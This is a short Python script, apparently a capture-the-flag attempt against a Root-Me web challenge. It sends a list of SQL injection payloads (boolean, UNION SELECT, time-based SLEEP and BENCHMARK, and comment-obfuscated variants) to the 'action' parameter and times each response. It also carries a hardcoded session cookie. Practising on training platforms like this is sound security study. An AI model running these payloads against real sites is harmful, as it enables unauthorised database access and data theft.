import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_action(payload):
    """Prueba inyección en el parámetro action"""
    params = {"action": payload}
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        length = len(r.text)
        print(f"Tiempo: {tiempo:.2f}s | Length: {length} | {payload[:40]}")
        return r.text, tiempo
    except:
        print(f"ERROR: {payload[:40]}")
        return None, 0

print("="*70)
print("  PROBANDO INYECCIÓN EN 'action'")
print("="*70)

# Baseline con action=member (funciona)
print("\n[Baseline] action=member:")
test_action("member")

# Probar diferentes inyecciones
payloads = [
    # Inyecciones básicas
    "login' OR '1'='1",
    "login' AND '1'='1",
    "login' UNION SELECT 1,2,3-- -",
    "login' UNION SELECT 1,2,3,4-- -",
    "login' AND SLEEP(5)-- -",
    "login' AND IF(1=1, SLEEP(5), 0)-- -",
    "login' AND BENCHMARK(10000000, MD5('x'))-- -",
    
    # Sin cerrar comilla (error)
    "login'",
    "login' OR 1=1-- -",
    "login' OR 1=1#",
    
    # Con comentarios
    "login'/**/OR/**/1=1-- -",
    "login'/**/AND/**/SLEEP(5)-- -",
    
    # Con CASE
    "login' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END-- -",
    
    # Con subconsultas
    "login' AND (SELECT SLEEP(5))-- -",
    "login' AND (SELECT IF(1=1, SLEEP(5), 0))-- -",
    
    # Probando con otros valores de action
    "member' OR '1'='1",
    "memberlist' OR '1'='1",
    "member' AND SLEEP(5)-- -",
]

for payload in payloads:
    test_action(payload)
    time.sleep(0.5)
